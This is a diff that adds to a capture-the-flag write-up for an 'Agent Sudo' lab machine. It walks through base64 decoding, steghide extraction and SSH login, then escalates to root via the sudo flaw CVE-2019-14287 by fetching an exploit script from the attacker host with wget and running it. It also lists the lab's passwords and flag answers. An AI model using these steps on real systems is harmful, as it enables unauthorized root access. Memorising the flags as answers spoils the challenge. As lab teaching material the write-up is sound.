@@ -218,8 +218,165 @@ Session completed.
 
 ```
 
+Once the zip file is extracted, we take a look at the contents of To_agentR.txt:
 
 
+![[Pasted image 20220818212316.png]]
+
+we see QXJlYTUx, but what is it?
+
+Upon searching the internet, I checked for decoder online and found the base64 decoder/encoder. Tried to decode and found the answer:
 
 
+steg password
+- Area 51
 
+![[Pasted image 20220818212419.png]]
+
+Looking at the other file (cute-alien.jpg), we can use steghide to check if someone left a message there:
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
+└─$ steghide extract -sf cute-alien.jpg 
+Enter passphrase: 
+wrote extracted data to "message.txt".
+                                           
+```
+
+![[Pasted image 20220818213416.png]]
+
+Who is the other agent (in full name)?
+- james
+
+SSH password
+- hackerrules!
+
+Using that, login to ssh as usual:
+
+```
+┌──(kali㉿kali)-[~/ken/MoonShine/CTF/Agent-sudo]
+└─$ ssh james@10.10.170.97      
+james@10.10.170.97's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Aug 19 01:36:17 UTC 2022
+
+  System load:  0.0               Processes:           96
+  Usage of /:   39.7% of 9.78GB   Users logged in:     0
+  Memory usage: 16%               IP address for eth0: 10.10.170.97
+  Swap usage:   0%
+
+
+75 packages can be updated.
+33 updates are security updates.
+
+
+Last login: Tue Oct 29 14:26:27 2019
+james@agent-sudo:~$ 
+
+```
+
+#### Capture the user flag
+
+You know the drill.
+
+What is the user flag?
+- b03d975e8c92a7c04146cfa7a5a313c7
+
+```
+james@agent-sudo:~$ ls
+Alien_autospy.jpg  user_flag.txt
+james@agent-sudo:~$ cat user_flag.txt 
+b03d975e8c92a7c04146cfa7a5a313c7
+james@agent-sudo:~$ 
+
+```
+
+
+What is the incident of the photo called?
+- Roswell alien autopsy
+
+Downloaded the image from user james site (using http.server) then reverse image using bing:
+
+![[Pasted image 20220818222920.png]]
+
+#### Privilege escalation
+
+
+Enough with the extraordinary stuff? Time to get real.
+
+CVE number for the escalation
+-  CVE-2019-14287
+
+Upon checking, we can first check sudo version as well as sudo -l for exploits:
+
+![[Pasted image 20220818224828.png]]
+
+```
+### SOFTWARE #############################################
+[-] Sudo version:
+Sudo version 1.8.21p2
+
+james@agent-sudo:~$ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+james@agent-sudo:~$ 
+
+```
+
+Looking through the internet we can find CVE-2019-14287
+ that affectes sudo versions 1.8.28 and below:
+
+
+![[Pasted image 20220818225003.png]]
+
+Upon thorough investigation we can also find scripts in .sh:
+
+https://github.com/n0w4n/CVE-2019-14287
+
+We can clone this in our kali machine, then use http.server to transfer files to the target. Then after what, we can now perform chmod then run the shell script to acquire the root and capture the flag:
+
+```
+james@agent-sudo:~$ wget "http://10.4.73.167:8081/sudo.sh"
+--2022-08-19 02:46:30--  http://10.4.73.167:8081/sudo.sh
+Connecting to 10.4.73.167:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1121 (1.1K) [text/x-sh]
+Saving to: ‘sudo.sh’
+
+sudo.sh                       100%[================================================>]   1.09K  --.-KB/s    in 0.001s  
+
+2022-08-19 02:46:32 (1.17 MB/s) - ‘sudo.sh’ saved [1121/1121]
+
+james@agent-sudo:~$ ls
+Alien_autospy.jpg  LinEnum.sh  sudo.sh  user_flag.txt
+james@agent-sudo:~$ chmod +x sudo.sh
+james@agent-sudo:~$ ./sudo.sh
+[sudo] password for james: 
+[-] This user has sudo rights
+[-] Checking sudo version
+[-] This sudo version is vulnerable
+[-] Trying to exploit
+root@agent-sudo:~# whoami
+root
+```
+
+
+What is the root flag?
+- b53a02f55b57d4439e3341834d70c062
+
+![[Pasted image 20220818225253.png]]
+
+
+(Bonus) Who is Agent R?
+- DesKel
+
+END
